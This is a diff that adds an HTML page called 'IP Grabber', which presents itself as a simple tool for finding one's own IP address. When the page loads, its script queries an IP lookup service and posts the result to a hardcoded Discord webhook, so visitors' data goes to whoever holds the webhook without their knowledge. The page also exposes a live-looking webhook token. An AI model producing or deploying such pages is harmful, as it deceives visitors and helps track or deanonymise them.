@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+    <body>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12">
+                    <h1>IP Grabber</h1>
+                    <p>
+                        This is a simple tool to grab your IP address.
+                    </p>
+
+                    <script src=
+                    "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+                        </script>
+                    <script type="application/javascript">
+const url = 'https://discord.com/api/webhooks/909545694505869404/1EiP-VWG90W_0OWjAKHwnU1QhqVKfZwV8to3XkORwo4N7gn3RljczcnJ3fyBg4TbaujW'
+
+
+// const { default: axios } = require('axios')
+// function send(msg){
+//     //send post request containing message with axios
+//     axios.post(url, {
+//         content: msg
+//     })
+//     .then(res => {
+//         console.log(res.data)
+//     }
+//     )
+//     .catch(err => {
+//         console.log(err)
+//     }
+//     )
+    
+// }
+//send function rewritten to use fetch instead of axios
+function send(msg){
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            content: msg
+        })
+    })
+    .then(res => {
+        console.log(res)
+    }
+    )
+    .catch(err => {
+        console.log(err)
+    }
+    )
+}
+
+
+
+
+fetch('https://api.ipify.org').then((response) => {
+    send(response)
+})
+                      </script>
+                      
+                      
+    </body>
+</html>
